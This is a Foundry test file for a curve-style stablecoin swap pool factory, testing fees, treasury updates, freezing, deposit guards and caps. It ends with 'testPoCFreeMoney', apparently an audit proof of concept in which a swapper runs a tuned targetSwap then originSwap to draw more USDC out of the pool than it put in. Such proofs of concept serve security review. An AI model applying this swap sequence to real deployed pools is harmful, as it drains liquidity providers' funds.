// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

import "../src/AssimilatorFactory.sol";
import "../src/CurveFactoryV2.sol";
import "../src/Curve.sol";
import "../src/interfaces/IERC20Detailed.sol";

import "./lib/MockUser.sol";
import "./lib/CheatCodes.sol";
import "./lib/Address.sol";
import "./lib/CurveParams.sol";
import "./lib/MockChainlinkOracle.sol";
import "./lib/MockOracleFactory.sol";

contract CurveFactoryV2Test is Test {
    CheatCodes cheats = CheatCodes(HEVM_ADDRESS);
    MockUser treasury;
    MockUser newTreasury;
    MockUser liquidityProvider;

    AssimilatorFactory assimilatorFactory;
    CurveFactoryV2 curveFactory;
    
    IERC20Detailed usdc = IERC20Detailed(Mainnet.USDC);
    IERC20Detailed cadc = IERC20Detailed(Mainnet.CADC);
    IERC20Detailed euroc = IERC20Detailed(Mainnet.EUROC);

    MockOracleFactory oracleFactory;
    MockUser swapper;
    IOracle fakeCadcOracles;

    IOracle usdcOracle = IOracle(Mainnet.CHAINLINK_USDC_USD);
    IOracle cadcOracle = IOracle(Mainnet.CHAINLINK_CAD_USD);
    IOracle eurocOracle = IOracle(Mainnet.CHAINLINK_EUR_USD);

    Curve dfxCadcCurve;
    Curve dfxEurocCurve;

    int128 public protocolFee = 50;

    function setUp() public {
        treasury = new MockUser();
        newTreasury = new MockUser();
        liquidityProvider = new MockUser();
        swapper = new MockUser();

        assimilatorFactory = new AssimilatorFactory();
        curveFactory = new CurveFactoryV2(
            protocolFee,
            address(treasury),
            address(assimilatorFactory)
        );

        // deploy mock oracle factory for deployed token (named gold)
        oracleFactory = new MockOracleFactory();
        fakeCadcOracles = oracleFactory.newOracle(
            // equiv to 1.91 because its 8 decimals
            address(cadc), "CADC-USDC-ORACLE", 8, 1_91_427_874
        );

        assimilatorFactory.setCurveFactory(address(curveFactory));

        cheats.startPrank(address(treasury));
        // Cadc Curve
        CurveInfo memory cadcCurveInfo = CurveInfo(
            string.concat("dfx-", cadc.name()),
            string.concat("dfx-", cadc.symbol()),
            address(cadc),
            address(usdc),
            DefaultCurve.BASE_WEIGHT,
            DefaultCurve.QUOTE_WEIGHT,
            // TODO change back to cadcOracle
            fakeCadcOracles,
            cadc.decimals(),
            usdcOracle,
            usdc.decimals(),
            DefaultCurve.ALPHA,
            DefaultCurve.BETA,
            DefaultCurve.MAX,
            DefaultCurve.EPSILON,
            DefaultCurve.LAMBDA
        );

        dfxCadcCurve = curveFactory.newCurve(cadcCurveInfo);
        dfxCadcCurve.turnOffWhitelisting();
        // Euroc Curve
        CurveInfo memory eurocCurveInfo = CurveInfo(
            string.concat("dfx-", euroc.name()),
            string.concat("dfx-", euroc.symbol()),
            address(euroc),
            address(usdc),
            DefaultCurve.BASE_WEIGHT,
            DefaultCurve.QUOTE_WEIGHT,
            eurocOracle,
            euroc.decimals(),
            usdcOracle,
            usdc.decimals(),
            DefaultCurve.ALPHA,
            DefaultCurve.BETA,
            DefaultCurve.MAX,
            DefaultCurve.EPSILON,
            DefaultCurve.LAMBDA
        );

        dfxEurocCurve = curveFactory.newCurve(eurocCurveInfo);
        dfxEurocCurve.turnOffWhitelisting();
        cheats.stopPrank();
    }

    function testFailDuplicatePairs() public {
        CurveInfo memory curveInfo = CurveInfo(
            string.concat("dfx-", cadc.name()),
            string.concat("dfx-", cadc.symbol()),
            address(cadc),
            address(usdc),
            DefaultCurve.BASE_WEIGHT,
            DefaultCurve.QUOTE_WEIGHT,
            cadcOracle,
            cadc.decimals(),
            usdcOracle,
            usdc.decimals(),
            DefaultCurve.ALPHA,
            DefaultCurve.BETA,
            DefaultCurve.MAX,
            DefaultCurve.EPSILON,
            DefaultCurve.LAMBDA
        );
        dfxCadcCurve = curveFactory.newCurve(curveInfo);
        fail("CurveFactory/currency-pair-already-exists");
    }

    function testUpdateFee() public {
        int128 newFee = 100_000;
        curveFactory.updateProtocolFee(newFee);
        assertEq(newFee, curveFactory.getProtocolFee());
    }

    function testFailUpdateFee() public {
        int128 newFee = 100_001;
        curveFactory.updateProtocolFee(newFee);
    }

    function testUpdateTreasury() public {
        assertEq(address(treasury), curveFactory.getProtocolTreasury());
        curveFactory.updateProtocolTreasury(address(newTreasury));
        assertEq(address(newTreasury), curveFactory.getProtocolTreasury());
    }

    // Global Transactable State Frozen
    function testFail_OwnerSetGlobalFrozen() public {
        cheats.prank(address(liquidityProvider));
        ICurveFactory(address(curveFactory)).setGlobalFrozen(true);
    }

    function testFail_GlobalFrozenDeposit() public {
        ICurveFactory(address(curveFactory)).setGlobalFrozen(true);
        
        cheats.prank(address(liquidityProvider));
        dfxCadcCurve.deposit(100_000, block.timestamp + 60);
    }

    function test_GlobalFrozeWithdraw() public {
        deal(address(cadc), address(liquidityProvider), 100_000e18);
        deal(address(usdc), address(liquidityProvider), 100_000e6);

        cheats.startPrank(address(liquidityProvider));
        cadc.approve(address(dfxCadcCurve), type(uint).max);
        usdc.approve(address(dfxCadcCurve), type(uint).max);

        dfxCadcCurve.deposit(100_000e18, block.timestamp + 60);
        (uint256 one, uint256[] memory derivatives) = dfxCadcCurve.viewDeposit(100_000e18);
        cheats.stopPrank();

        assertEq(dfxCadcCurve.balanceOf(address(liquidityProvider)), 100_000e18);

        cheats.prank(address(this));
        ICurveFactory(address(curveFactory)).setGlobalFrozen(true);
        
        // can still withdraw after global freeze
        cheats.prank(address(liquidityProvider));
        dfxCadcCurve.withdraw(100_000e18, block.timestamp + 60);
    }

    function test_depositGlobalGuard(uint256 _gGuardAmt) public {
        cheats.assume(_gGuardAmt > 10_000e18);
        cheats.assume(_gGuardAmt < 100_000_000e18);
        // enable global guard
        curveFactory.toggleGlobalGuarded();
        // set global guard amount to 100k
        curveFactory.setGlobalGuardAmount(_gGuardAmt);

        deal(address(cadc), address(liquidityProvider), _gGuardAmt * 2);
        deal(address(usdc), address(liquidityProvider), _gGuardAmt / 1e12);

        cheats.startPrank(address(liquidityProvider));
        cadc.approve(address(dfxCadcCurve), type(uint).max);
        usdc.approve(address(dfxCadcCurve), type(uint).max);

        dfxCadcCurve.deposit(_gGuardAmt, block.timestamp + 60);
        cheats.stopPrank();
    }

    function testFail_depositGlobalGuard(uint256 _extraAmt) public {
        cheats.assume(_extraAmt > 1);
        cheats.assume(_extraAmt < 100_100e18);
        // enable global guard
        curveFactory.toggleGlobalGuarded();
        // set global guard amount to 100k
        curveFactory.setGlobalGuardAmount(100_000e18);

        deal(address(cadc), address(liquidityProvider), 200_000e18);
        deal(address(usdc), address(liquidityProvider), 200_000e6);

        cheats.startPrank(address(liquidityProvider));
        cadc.approve(address(dfxCadcCurve), type(uint).max);
        usdc.approve(address(dfxCadcCurve), type(uint).max);

        dfxCadcCurve.deposit(100_000e18 + _extraAmt, block.timestamp + 60);
        cheats.stopPrank();
    }

    function test_depositPoolGuard(uint256 _extraAmt) public {
        cheats.assume(_extraAmt > 1);
        cheats.assume(_extraAmt < 20_000e18);
        // enable global guard
        curveFactory.toggleGlobalGuarded();
        // set global guard amount to 100k
        curveFactory.setGlobalGuardAmount(100_000e18);
        // while global guard amt is 100k, Euroc pool guard amt is 80k
        curveFactory.setPoolGuarded( address(dfxEurocCurve), true );
        curveFactory.setPoolGuardAmount(address(dfxEurocCurve), 80_000e18);

        deal(address(euroc), address(liquidityProvider), 300_000e6);
        deal(address(usdc), address(liquidityProvider), 300_000e6);

        cheats.startPrank(address(liquidityProvider));
        euroc.approve(address(dfxEurocCurve), type(uint).max);
        usdc.approve(address(dfxEurocCurve), type(uint).max);
        // deposit less than 80k
        dfxEurocCurve.deposit(80_000e18 - _extraAmt, block.timestamp + 60);
        cheats.stopPrank();
    }

    function testFail_depositPoolGuard(uint256 _extraAmt) public {
        cheats.assume(_extraAmt > 1);
        cheats.assume(_extraAmt < 20_000e18);
        // enable global guard
        curveFactory.toggleGlobalGuarded();
        // set global guard amount to 100k
        curveFactory.setGlobalGuardAmount(100_000e18);
        // while global guard amt is 100k, Euroc pool guard amt is 80k
        curveFactory.setPoolGuarded( address(dfxEurocCurve), true );
        curveFactory.setPoolGuardAmount(address(dfxEurocCurve), 80_000e18);

        deal(address(euroc), address(liquidityProvider), 300_000e6);
        deal(address(usdc), address(liquidityProvider), 300_000e6);

        cheats.startPrank(address(liquidityProvider));
        euroc.approve(address(dfxEurocCurve), type(uint).max);
        usdc.approve(address(dfxEurocCurve), type(uint).max);
        // deposit more than 80k
        dfxEurocCurve.deposit(80_000e18 + _extraAmt, block.timestamp + 60);
        cheats.stopPrank();
    }

    function test_depositPoolCap() public {
        
        // set pool cap to 100k
        curveFactory.setPoolCap(address(dfxEurocCurve), 100_000e18);

        deal(address(euroc), address(liquidityProvider), 200_000e6);
        deal(address(usdc), address(liquidityProvider), 200_000e6);

        cheats.startPrank(address(liquidityProvider));
        euroc.approve(address(dfxEurocCurve), type(uint).max);
        usdc.approve(address(dfxEurocCurve), type(uint).max);

        dfxEurocCurve.deposit(100_000e18, block.timestamp + 60);
        cheats.stopPrank();
    }

    function testFail_depositPoolCap(uint256 _extraAmt) public {
        cheats.assume(_extraAmt > 1);
        cheats.assume(_extraAmt < 10_000e18);
        // set pool cap to 100k
        curveFactory.setPoolCap(address(dfxEurocCurve), 100_000e18);

        deal(address(euroc), address(liquidityProvider), 200_000e6);
        deal(address(usdc), address(liquidityProvider), 200_000e6);

        cheats.startPrank(address(liquidityProvider));
        euroc.approve(address(dfxEurocCurve), type(uint).max);
        usdc.approve(address(dfxEurocCurve), type(uint).max);

        dfxEurocCurve.deposit(100_000e18 + _extraAmt, block.timestamp + 60);
        cheats.stopPrank();
    }

    function testPoCFreeMoney() public { 
        // set this for no fuzzing 
        uint256 price = 191427874;
        uint256 amounts = 249741435547872736176;
        // uint256 amounts = 249741435547872736176450;
        
        // cheats.assume(price > 10 ** 8);
        // cheats.assume(price < 4 * 10 ** 8);
        // cheats.assume(amounts > 1e18);
        // cheats.assume(amounts < 600000e18 * 1e8 / price);
        
        // TODO add set price function after
        // MockChainlinkOracle(address(cadcOracle)).setPrice(int256(price));
        
        cheats.startPrank(address(liquidityProvider));
        deal(address(cadc), address(liquidityProvider), 1500000e18 * 1e8 / price); 
        deal(address(usdc), address(liquidityProvider), 1500000e6); 
        cadc.approve(address(dfxCadcCurve), type(uint256).max); 
        usdc.approve(address(dfxCadcCurve), type(uint256).max);
        
        // the LP provides $2M worth of LP
        dfxCadcCurve.deposit(2000000e18, block.timestamp + 60);
        emit log_named_uint("Curve CADC amount", cadc.balanceOf(address(dfxCadcCurve))); 
        emit log_named_uint("Curve USDC amount", usdc.balanceOf(address(dfxCadcCurve))); 
        cheats.stopPrank();
        
        cheats.startPrank(address(swapper));
        deal(address(usdc), address(swapper), 1_500_000e6);
        // deal(address(cadc), address(swapper), 1_500_000e18);
        cadc.approve(address(dfxCadcCurve), type(uint256).max);
        usdc.approve(address(dfxCadcCurve), type(uint256).max);
        uint256 amountReal = dfxCadcCurve.targetSwap(address(usdc), address(cadc), type(uint256).max, amounts, block.timestamp + 60);
        console.log(amountReal);
        uint256 amountRecv = dfxCadcCurve.originSwap(address(cadc), address(usdc), cadc.balanceOf(address(swapper)), 0, block.timestamp + 60);
        console.log(amountRecv);
        cheats.stopPrank();
        
        emit log_named_uint("USDC balance of swapper",
        usdc.balanceOf(address(swapper)));
        emit log_named_uint("Curve CADC amount", cadc.balanceOf(address(dfxCadcCurve)));
        emit log_named_uint("Curve USDC amount", usdc.balanceOf(address(dfxCadcCurve)));
        
        require(usdc.balanceOf(address(swapper)) >= 1510000e6, "free money!!");
    }
}
